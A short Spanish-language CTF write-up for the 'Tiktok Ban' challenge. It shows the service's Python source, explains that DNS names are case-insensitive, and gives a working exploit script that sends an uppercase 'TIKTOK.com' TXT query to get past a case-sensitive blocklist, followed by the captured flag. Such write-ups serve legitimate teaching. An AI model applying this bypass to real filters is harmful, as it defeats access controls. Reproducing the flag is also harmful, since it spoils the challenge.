# Tiktok Ban

Codigo fuente:

``` python
#!/usr/local/bin/python -u

import subprocess
import sys
import socket

#from flag import flag
flag="flag{fakeflag}"

dns_ip_addr = "127.0.0.1"
dns_port = 25565

subprocess.run(
        ['/app/dnsmasq',
         '-x', 'dnsmasq.pid',
         '-p', f'{dns_port}',
         '--txt-record', f'tiktok.com,{flag}'])

size = sys.stdin.buffer.read(4)
size = int.from_bytes(size)

req = sys.stdin.buffer.read(size)

if b'tiktok\x03com' in req:
    print("Sorry, TikTok isn't available right now. A law banning TikTok has been enacted in the U.S. Unfortunately, that means you can't use TikTok for now. We are fortunate that President Trump has indicated that he will work with us on a solution to reinstate TikTok once he takes office. Please stay tuned!")
else:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(req, (dns_ip_addr, dns_port))
    resp = sock.recv(1024)
    print(resp)
```


El programa levanta un servidor DNS con un registro TXT para el dominio `tiktok.com` que contiene la flag.

Se espera que se envie una peticion DNS predecedida por 4 bytes que representan la longitud en bytes que se va a leer de la consulta.

El protocolo DNS es insensible a mayusculas, o sea `tiktok.com` y `TIKTOK.COM` son el mismo dominio.

Exploit:
``` python
import dns.message, dns.query
import socket

# Crear consulta DNS TXT para flag.tiktok.com
query = dns.message.make_query("TIKTOK.com", dns.rdatatype.TXT)

# Enviar consulta al servicio
with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
    s.connect(('challs.umdctf.io',32300))
    s.send(len(query.to_wire()).to_bytes(4) + query.to_wire())
    response = s.recv(1024)

# Extraer la flag de la respuesta DNS
print(response.decode())
```

`{W31C0M3_84CK_4ND_7H4NK5_F0r_Y0Ur_P4713NC3_4ND_5UPP0r7_45_4_r35U17_0F_Pr351D3N7_7rUMP_71K70K_15_84CK_1N_7H3_U5}`
